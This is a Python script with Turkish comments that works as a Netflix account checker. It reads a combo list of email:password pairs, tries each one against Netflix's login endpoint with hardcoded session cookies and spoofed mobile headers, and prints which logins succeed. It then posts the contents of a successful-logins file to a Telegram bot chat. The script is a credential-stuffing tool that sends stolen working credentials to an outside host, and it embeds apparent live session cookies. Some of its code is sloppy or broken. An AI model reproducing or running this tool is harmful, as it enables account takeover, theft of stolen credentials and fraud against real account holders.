import requests
import telebot
import os

um4tcombo = input(" Combo Yolu Gir:")

os.system('cls' if os.name == 'nt' else 'clear') 
    

# Telegram bot bilgileri
TOKEN = input('𝐓𝐨𝐤𝐞𝐧:  ')
print(f'•••••••••••••••••••••••••••••••••••••••••••••')
ID = input('𝐈𝐝:  ')	
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"

L = '\033[1;33m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
C = "\033[1;97m" 
X = '\037' 
G = '\033[1;32m'
R = '\033[1;31m'
O = '\x1b[38;5;208m' 
F = '\033[1;32m' 
bot = telebot.TeleBot(TOKEN)
if TOKEN is None:
    print("Hata: TOKEN çevresel değişkeni tanımlanmamış.")

os.system('cls' if os.name == 'nt' else 'clear') 

cookies = {
    'nfvdid': 'BQFmAAEBELDeydBu-B7PmydTkOO0vYdAtYVwI9KWBNRdKgnsTiwqvdug1ckMviwDnBOjCRBYUyAVpKXGNG7itPKa9mk98pvDn4IYoct3yt4knzHr1qCE8w%3D%3D',
    'SecureNetflixId': 'v%3D3%26mac%3DAQEAEQABABSTfmuUIbx1xMYVcxem25QXxwlzxtYLqrE.%26dt%3D1738609699000',
    'NetflixId': 'v%3D3%26ct%3DBgjHlOvcAxLAAWqkfqKKvnDFVhWrewdeyH5OjT4gDV-Qheft2G6qYGlqsFc2_wkjT_2wAQbVoVzru-ZRO3-F3_x3Z7ujwvydWJqLqJY2fghSRBDWoPDBFivP6a21txY_fctLx2jlPwkdbgJX1y2BZyhuSllsDd2ACcqSFa25KgOXAgs7pIMCuXf7hF-wbBWWKDnxXWxUzWaAgUcN2e_nofx-mLSnwvayOCDQrF_j8cUlTmKEcsSF6f4biy2S9OSUburbxrzj6sbyvhgGIg4KDBvvOZvuB2KmiGQ7OA..',
    'flwssn': '909b615a-f0c8-42b6-9244-fba0660f1bfc',
    'OptanonAlertBoxClosed': '2025-02-03T19:08:36.798Z',
    'OptanonConsent': 'isGpcEnabled=0&datestamp=Mon+Feb+03+2025+22%3A08%3A36+GMT%2B0300+(GMT%2B03%3A00)&version=202411.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=3c46e996-e511-4276-b6a5-477ca515cfd7&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&intType=1',
}

headers = {
    'authority': 'www.netflix.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': 'nfvdid=BQFmAAEBELDeydBu-B7PmydTkOO0vYdAtYVwI9KWBNRdKgnsTiwqvdug1ckMviwDnBOjCRBYUyAVpKXGNG7itPKa9mk98pvDn4IYoct3yt4knzHr1qCE8w%3D%3D; SecureNetflixId=v%3D3%26mac%3DAQEAEQABABSTfmuUIbx1xMYVcxem25QXxwlzxtYLqrE.%26dt%3D1738609699000; NetflixId=v%3D3%26ct%3DBgjHlOvcAxLAAWqkfqKKvnDFVhWrewdeyH5OjT4gDV-Qheft2G6qYGlqsFc2_wkjT_2wAQbVoVzru-ZRO3-F3_x3Z7ujwvydWJqLqJY2fghSRBDWoPDBFivP6a21txY_fctLx2jlPwkdbgJX1y2BZyhuSllsDd2ACcqSFa25KgOXAgs7pIMCuXf7hF-wbBWWKDnxXWxUzWaAgUcN2e_nofx-mLSnwvayOCDQrF_j8cUlTmKEcsSF6f4biy2S9OSUburbxrzj6sbyvhgGIg4KDBvvOZvuB2KmiGQ7OA..; flwssn=909b615a-f0c8-42b6-9244-fba0660f1bfc; OptanonAlertBoxClosed=2025-02-03T19:08:36.798Z; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Feb+03+2025+22%3A08%3A36+GMT%2B0300+(GMT%2B03%3A00)&version=202411.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=3c46e996-e511-4276-b6a5-477ca515cfd7&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&intType=1',
    'referer': 'https://www.netflix.com/tr/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"TECNO LG6n"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}


with open(um4tcombo, 'r') as file:
	for line in file:
		try:
			email,password = line.strip().split(':')
			data = {
			'email': email,
			'password': password,
}

			response = requests.get('https://www.netflix.com/ajax/login', cookies=cookies, headers=headers, data=data)
			if response.text == 'True':
				print(f' Başarılı Giriş ✅ {email} | {password} ')
			else:
					print(f' Başarısız Giriş ❎ {email} | {password} ')
		except Exception as e:
					print(' hata {e} ')

			
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": ID, "text": message}  # CHAT_ID yerine ID kullanıldı
    requests.post(url, data=data)

success_file = "basarili_girisler.txt"  # Başarılı girişlerin kaydedildiği dosya

# Dosyadan başarılı girişleri oku ve Telegram'a gönder
if os.path.exists(success_file):
    with open(success_file, 'r') as sf:
        success_data = sf.read()

    if success_data.strip():  # Eğer dosyada veri varsa
        send_to_telegram("🎉 Netflix Başarılı Girişler 🎉\n" + success_data)
									